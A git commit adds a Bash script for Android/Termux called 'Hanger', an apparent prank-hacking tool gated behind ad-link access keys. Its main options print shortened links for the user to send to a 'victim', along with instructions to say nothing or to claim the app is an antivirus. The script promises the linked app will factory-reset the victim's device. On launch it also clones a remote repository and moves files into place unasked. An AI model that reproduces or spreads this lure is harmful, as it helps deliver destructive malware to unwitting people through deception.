812a74598f2f7dd256172012aa45ecd9c84c6360
Jatin Kalwar <77274095+jatinkalwar@users.noreply.github.com>
2021-07-21 23:42:39 -0700

    Add files via upload

---
+++ hanger.sh
@@ -0,0 +1,381 @@
+# A tool by nitro from www.noob-hackers.com
+# Be a unique person not copy cat
+# Colours
+#-----------------
+red="\e[91m"
+rset="\e[0m"
+grn="\e[92m"
+ylo="\e[93m"
+blue="\e[94m"
+cyan="\e[96m"
+pink="\e[95m"
+#-----------------
+# scripting start
+
+banner(){
+clear
+echo -e '\e[93m               
+                           __________
+                        .~#########%%;~.
+                       /############%%;`\
+                      /######/~\/~\%%;,;,\
+                     |#######\    /;;;;.,.|
+                     |#########\/%;;;;;.,.|
+            XX       |##/~~\####%;;;/~~\;,|       XX
+          XX..X      |#|  o  \##%;/  o  |.|      X..XX
+        XX.....X     |##\____/##%;\____/.,|     X.....XX
+   XXXXX.....XX      \#########/\;;;;;;,, /      XX.....XXXXX
+  X |......XX%,.@      \######/%;\;;;;, /      @#%,XX......| X
+  X |.....X  @#%,.@     |######%%;;;;,.|     @#%,.@  X.....| X'
+echo -e   '\e[92mX  \...X     @#%,.@   ----------------    @ @ 00 0 xxxxxxxxx
+   X# \.X        @#%,.@   Hanger v1.0      @#%,.@        
+                  @#%,.@              @#%,.@          
+                    @#%,.@          @#%,.@            
+                       @#%,.@      @#%,.@             
+                         @#%.,@  @#%,.@              
+                          JATIN KALWAR
+'
+echo " " 
+echo -e "$red                        ▶Coded by$grn JATIN$red◀$rset"
+echo -e "$red                      ⫸$ylo YOURHACKINGHOUSE$red ⫷$rset"
+echo 
+# Functions
+echo -e "$red                     [Infect them with fun]$rset"
+echo " "
+echo " "
+}
+ban1(){
+clear
+echo -e '\e[93m               
+                         __________
+                      .~#########%%;~.
+                     /############%%;`\
+                    /######/~\/~\%%;,;,\
+                   |#######\    /;;;;.,.|
+                   |#########\/%;;;;;.,.|
+          XX       |##/~~\####%;;;/~~\;,|       XX
+        XX..X      |#|  o  \##%;/  o  |.|      X..XX
+      XX.....X     |##\____/##%;\____/.,|     X.....XX
+ XXXXX.....XX      \#########/\;;;;;;,, /      XX.....XXXXX
+X |......XX%,.@      \######/%;\;;;;, /      @#%,XX......| X
+X |.....X  @#%,.@     |######%%;;;;,.|     @#%,.@  X.....| X'
+echo -e '\e[92mX  \...X     @#%,.@   ----------------    @ @ 00 0 xxxxxxxxx
+ X# \.X        @#%,.@         @#%,.@        
+                @#%,.@              @#%,.@          
+                  @#%,.@          @#%,.@            
+                     @#%,.@      @#%,.@             
+                       @#%.,@  @#%,.@              
+                        
+'
+echo " " 
+echo -e "$red                       ▶Coded by$grn JATIN$red◀$rset"
+echo -e "$red                      ⫸$ylo YOURHACKINGHOUSE$red ⫷$rset"
+echo 
+# Functions
+echo -e "$red                     [Infect them with fun]$rset"
+echo " "
+echo " "
+}
+menu(){
+echo -e "$grn             ＞＞＞＞>>>＞$ylo [Options]$grn ＜<<<＜＜＜＜$rset"
+echo " "
+echo " "
+echo -e "$red                        ➡$cyan [\e[92m1\e[96m] Infect now"
+echo -e "$red                        ➡$cyan [\e[92m2\e[96m] Save now"
+echo -e "$red                        ➡$cyan [\e[92m3\e[96m] Access key"
+echo -e "$red                        ➡$cyan [\e[92m4\e[96m] About"
+echo -e "$red                        ➡$cyan [\e[92m5\e[96m] Reclone script "
+echo -e "$red                        ➡$cyan [\e[92m6\e[96m] Subscribe"
+echo -e "$red                        ➡$cyan [\e[92m7\e[96m] More"
+echo -e "$red                        ➡$cyan [\e[92m8\e[96m] Exit"
+echo " "
+echo " "
+echo -e "$grn               >＞＞＞＞＞$ylo [SELECT]$grn ＜＜＜＜＜<$rset"
+echo " "
+echo -ne "\e[92m#SELECT OPTION\e[92m: "
+read optnz
+if [ $optnz = "1" ];
+then
+
+vir
+elif [ $optnz = "2" ];
+then
+
+sav
+elif [ $optnz = "4" ];
+then
+about
+elif [ $optnz = "5" ];
+then
+upd
+elif [ $optnz = "6" ];
+then
+am start -a android.intent.action.VIEW -d https://www.youtube.com/channel/UCMwPUQZrcSMzaW4yzhsXCXw > /dev/null 2>&1
+banner
+menu
+elif [ $optnz = "7" ];
+then
+am start -a android.intent.action.VIEW -d https://github.com/jatinkalwar > /dev/null 2>&1
+banner
+menu
+elif [ $optnz = "8" ];
+then
+exit 1
+else
+echo "wrong"
+exit
+fi
+}
+virus(){
+################
+clear
+echo
+echo -e '\e[92m 
+                    _  _  _____  ____  ____ 
+                   ( \( )(  _  )(_  _)( ___)
+                    )  (  )(_)(   )(   )__) 
+                   (_)\_)(_____) (__) (____) '
+echo " "
+echo -e "\e[91m 😈  Copy below link and send it your victim and 
+say nothing to him. when he install it in his 
+device it will be factory reset and lot more happens.
+                                👇👇👇
+
+         \e[92mL1NK :- \e[96mhttps://bit.ly/3ild93L\e[91m
+
+                                 👆👆👆
+Use only for fun purpose not for harming someone 😇✌️.
+And our channel is not responsible for any kind of loss 
+you do to other's by this script."
+echo
+echo -ne "\e[92m#Type exit : "
+read exitz
+if [ $exitz = "exit" ];
+then
+banner
+menu
+else
+banner
+menu
+fi
+}
+save(){
+clear
+echo
+echo -e '\e[92m 
+                    _  _  _____  ____  ____ 
+                   ( \( )(  _  )(_  _)( ___)
+                    )  (  )(_)(   )(   )__) 
+                   (_)\_)(_____) (__) (____) '
+echo " "
+echo " "
+echo -e "\e[93m  Copy below link and send it your victim and tell him
+that he should install this application or else his 
+device will not be recovered.(Antivirus)
+                    👇👇👇
+
+        \e[92mL1NK :- \e[96mhttps://bit.ly/3fX8ljZ\e[93m
+
+                    👆👆👆
+Use only for fun purpose not for harming someone 😇✌️. 
+And our channel is not responsible for any kind of 
+loss you do to other's by this script."
+echo
+echo -ne "\e[92m#Type exit : "
+read exitz
+if [ $exitz = "exit" ];
+then
+banner
+menu
+else
+banner
+menu
+fi
+}
+about(){
+clear
+echo -e '\e[91m
+                     ──▐─▌──▐─▌──
+                     ─▐▌─▐▌▐▌─▐▌─
+                     ─█▄▀▄██▄▀▄█─
+                     ──▄──██▌─▄──
+                     ▄▀─█▀██▀█─▀▄
+                     ▐▌▐▌─▐▌─▐▌▐▌
+                     ─▐─█────█─▌─
+                     ────▌──▐────
+'
+echo -e "\e[93m                    CALL ME \e[92mJATT" | pv -qL 10
+echo -e "\e[93m               REAL NAME \e[92mJATIN KALWAR" | pv -qL 10
+echo -e "\e[93m             IAM FROM \e[92mYOURHACKINGHOUSE" | pv -qL 10
+echo -e "\e[93m        IM A \e[92mGEEK\e[93m WITH LOTS OF EXCITEMENT" | pv -qL 10
+echo -e "\e[93m            HOPE YOU LIKE THIS HANGER" | pv -qL 10
+echo -e "\e[93m         OOPS... I TALK A LOT SRY FOR THAT " | pv -qL 10
+echo -e "\e[93m              JOIN GROUPS ON \e[92mWHATS' APP" | pv -qL 10
+echo -e "\e[93m        MY WEBSITE:\e[92m https://bit.ly/2QT6dSR \e[0m" | pv -qL 10
+
+echo -e "\e[92m                BYEE.............." | pv -qL 10
+sleep 6.0
+banner
+menu
+}
+upd(){
+if [ -d "$HOME/hanger" ];
+then
+cd $HOME
+rm -rf hanger
+elif [ -d "$HOME/hanger" ];
+then
+cd $HOME
+rm -rf hanger
+else
+echo
+exit 1
+fi
+cd $HOME
+sleep 1
+echo -e "         \e[96mUPDATE IS GOING ON, PLEASE WAIT FOR A WHILE...!\e[0m"
+echo
+printf "                     \e[96m["
+# While process is running...
+while git clone https://github.com/jatinkalwar/hanger 2> /dev/null; do 
+    printf  "\e[92m▓▓▓▓▓▓▓▓▓▓▓▓▓\e[0m"
+    sleep 1
+done
+printf "\e[96m]\e[0m"
+echo
+echo
+echo
+printf "\e[96m           UPDATE SUCCESSFULL (LATEST VERSION)..!\e[0m"
+sleep 2.0
+cd $HOME
+cd hanger
+bash hanger.sh
+}
+
+
+vir() {
+
+
+clear
+banner
+figlet HANGER | lolcat
+echo -e "\e[31mPLEASE ENTER ACCESS KEY IF YOU DON'T HAVE ACCESS KEY THEN GO TO MAIN MENU AND CHOOSE OPTION 2 FOR ACCESS KEY" | pv -qL 50 
+echo -e "\e[93m"
+read  -p "ACCESS KEY: " access
+cd $HOME/hanger/deal
+bas=$(cat hang.txt)
+if [[ $access = $bas ]];
+then
+virus
+else
+clear
+echo " "
+echo -e "               \e[34m ============================\e[34m"
+echo -e "               \e[34m |     \e[93mOOPS WRONG KEY...!\e[34m   |"
+echo -e "               \e[34m |                          |"
+echo -e "               \e[34m |    Use shortlink for key |"
+echo -e "               \e[34m |\e[92mhttps://gplinks.co/HsAVzF\e[34m |"
+echo -e "               \e[34m |            [OR]          |"
+echo -e "               \e[34m |\e[92m    https://bit.ly/3AeiAuD\e[34m|"
+echo -e "               \e[34m ============================\e[34m"
+echo " "
+fi
+sleep 5.0
+banner
+menu
+
+
+}
+
+sav() {
+clear
+banner
+figlet HANGER | lolcat
+echo -e "\e[31mPLEASE ENTER ACCESS KEY IF YOU DON'T HAVE ACCESS KEY THEN GO TO MAIN MENU AND CHOOSE OPTION 2 FOR ACCESS KEY" | pv -qL 50 
+echo -e "\e[93m"
+read  -p "ACCESS KEY: " access
+cd $HOME/hanger/deal
+bas=$(cat hang.txt)
+if [[ $access = $bas ]];
+then
+save
+else
+clear
+echo " "
+echo -e "               \e[34m ============================\e[34m"
+echo -e "               \e[34m |     \e[93mOOPS WRONG KEY...!\e[34m   |"
+echo -e "               \e[34m |                          |"
+echo -e "               \e[34m |    Use shortlink for key |"
+echo -e "               \e[34m |\e[92mhttps://gplinks.co/HsAVzF\e[34m |"
+echo -e "               \e[34m |            [OR]          |"
+echo -e "               \e[34m |\e[92m    https://bit.ly/3AeiAuD\e[34m|"
+echo -e "               \e[34m ============================\e[34m"
+echo " "
+fi
+sleep 5.0
+banner
+menu
+}
+
+
+upda() {
+
+if [ -d "$HOME/hanger/deal" ];
+then
+cd $HOME/hanger/deal
+rm hang.txt
+elif [ -d "$HOME/hanger/deal" ];
+then
+cd $HOME/hanger/deal
+rm hang.txt
+else
+echo
+exit 1
+fi
+cd $HOME
+echo -e "         \e[96mUPDATING API, PLEASE WAIT FOR A WHILE...!\e[0m"
+echo
+printf "                     \e[96m["
+# While process is running...
+while git clone https://github.com/jatinkalwar/toolupdater 2> /dev/null; do 
+    printf  "\e[92m▓▓▓▓▓▓▓▓▓▓▓▓▓\e[0m"
+    
+done
+printf "\e[96m]\e[0m"
+echo
+echo
+echo
+printf "\e[96m           API UPDATED SUCCESSFULLY (LATEST VERSION)..!\e[0m"
+
+cd $HOME
+cd toolupdater/error
+mv hang.txt $HOME/hanger/deal
+cd $HOME/toolupdater/hangu
+mv update.txt $HOME/hanger/deal
+cd $HOME
+rm -rf toolupdater
+ake
+}
+
+ake() {
+ecret="update v1.1"
+cd $HOME/hanger/deal
+ztet=$(cat update.txt)
+if [[ $ecret = $ztet ]];
+then
+cd $HOME/hanger/deal
+rm update.txt
+echo "hieee"
+sleep 3.0
+else
+cd $HOME/hanger/deal
+rm update.txt
+fi
+clear
+banner
+menu
+}
+
+banner
+upda
+
